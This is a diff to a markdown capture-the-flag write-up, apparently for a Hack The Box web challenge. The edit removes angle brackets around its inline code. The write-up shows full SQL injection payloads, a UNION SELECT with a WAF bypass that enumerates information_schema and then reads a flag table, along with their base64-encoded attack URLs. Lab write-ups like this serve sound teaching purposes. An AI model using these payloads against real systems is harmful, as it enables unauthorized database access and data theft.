@@ -23,16 +23,16 @@ i open the challenge its an error lets see what we will do .
 
 ![placeholder](https://i.imgur.com/qxWpyff.png)
 
-lets put any value in obj : `<http://docker.hackthebox.eu:30268/?obj=1>`
+lets put any value in obj : `http://docker.hackthebox.eu:30268/?obj=1`
 
 ![placeholder](https://i.imgur.com/HA1dt1Z.png)
 
-nice its work .. lets determine 'id' property : `<http://docker.hackthebox.eu:30268/?obj[id]=1>`
+nice its work .. lets determine 'id' property : `http://docker.hackthebox.eu:30268/?obj[id]=1`
 
 ![placeholder](https://i.imgur.com/ErPIhyx.png)
 
-okaaai .. its take any input and decode it to base64 , so lets encode this `<{"ID": "1"}>`
-`<http://docker.hackthebox.eu:30268/?obj=eyAiSUQiOiAiMSJ9>`
+okaaai .. its take any input and decode it to base64 , so lets encode this `{"ID": "1"}`
+`http://docker.hackthebox.eu:30268/?obj=eyAiSUQiOiAiMSJ9`
 
 ![placeholder](https://i.imgur.com/MkEjV2Z.png)
 
@@ -44,11 +44,11 @@ its being filterd by `<WAF>` so lets bypass it
 
 ![placeholder](https://i.imgur.com/UAB6mFx.png)
 
-I tried this payload `<{"ID": "a' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT schema_name FROM information_schema.schemata)b -- a"}>` 
+I tried this payload `{"ID": "a' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT schema_name FROM information_schema.schemata)b -- a"}` 
 
 and encode it 
 
-`<http://docker.hackthebox.eu:30268/?obj=eyJJRCI6ICJhJyBVTklPTiBTRUxFQ1QgKiBGUk9NIChTRUxFQ1QgMSlhIEpPSU4gKFNFTEVDVCBzY2hlbWFfbmFtZSBGUk9NIGluZm9ybWF0aW9uX3NjaGVtYS5zY2hlbWF0YSliIC0tIGEifQ==>`
+`http://docker.hackthebox.eu:30268/?obj=eyJJRCI6ICJhJyBVTklPTiBTRUxFQ1QgKiBGUk9NIChTRUxFQ1QgMSlhIEpPSU4gKFNFTEVDVCBzY2hlbWFfbmFtZSBGUk9NIGluZm9ybWF0aW9uX3NjaGVtYS5zY2hlbWF0YSliIC0tIGEifQ==`
 
 ![placeholder](https://i.imgur.com/5EswifW.png)
 
@@ -62,7 +62,7 @@ lets dipaly names of the tables :
 
 here we go we get the flag table 
 
-`<http://docker.hackthebox.eu:30268/?obj=eyJJRCI6ICJhJ1VOSU9OIFNFTEVDVCAqIEZST00gKFNFTEVDVCAxKWEgSk9JTiAoc2VsZWN0ICogZnJvbSBGbGFnVGFibGVVbmd1ZXNzYWJsZUV6UFopYiAtLSBhIn0>`
+`http://docker.hackthebox.eu:30268/?obj=eyJJRCI6ICJhJ1VOSU9OIFNFTEVDVCAqIEZST00gKFNFTEVDVCAxKWEgSk9JTiAoc2VsZWN0ICogZnJvbSBGbGFnVGFibGVVbmd1ZXNzYWJsZUV6UFopYiAtLSBhIn0`
 
 ![placeholder](https://i.imgur.com/CUkmWhm.png)
 
